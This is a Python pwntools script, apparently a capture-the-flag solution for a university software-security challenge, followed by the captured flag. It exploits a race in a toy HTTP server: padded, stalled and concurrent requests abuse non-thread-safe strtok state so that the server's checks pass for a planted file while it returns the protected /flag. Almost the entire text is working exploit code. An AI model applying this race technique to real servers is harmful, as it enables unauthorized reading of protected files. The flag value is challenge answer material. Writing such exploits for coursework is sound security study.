from pwn import *
import time


host = "tasks.ws24.softsec.rub.de"
port = 33118

# place an existing file on the server for which checks succeed
r = remote(host, port)
r.send(b"PUT /fileA HTTP/1.0\r\nContent-Length: 16\r\n\r\n" + b"A"*16)
r.close()


while True:
    race = remote(host, port)
    stalling = remote(host, port)

    # send request that slows down the server as it is an incomplete request
    stalling.send(b" "*1600 + b"GET\r\n")

    # try to get the created file
    race.send(b" "*1600 + b"GET /fileA HTTP/1.0 /bar HTTP/1.0\r\n\r\n") #this has the same size as flag.send below
    race.close()

    # wait for everything to be received by the server
    time.sleep(0.5)

    # send multiple requests to get flag instead
    # as strtok is not thread safe and keeps an internal state
    # we achieve a race condition where checks for fileA are passed
    # but then flag is read from the system instead for the stalling connection
    l = []
    for i in range(20):
        flag = remote(host, port)
        flag.send(b" "*1600 + b"GET //flag HTTP/1.0                \r\n")
        l.append(flag)

    # finish requests all at once and close them
    for r in l:
        r.send(b"\r\n")
        r.close()
    stalling.send(b"\r\n")

    # if obtained flag, print it
    stalling.recvlines(4)
    response = stalling.recvall()
    if b"softsec" in response:
        print(response)
        break

    stalling.close()

# softsec{r8agiJzpvQBxDJu83AtViBKNcH8WiDbBlpf-bahUP6zB4uL-k7Gb8JxALe9kWkE9}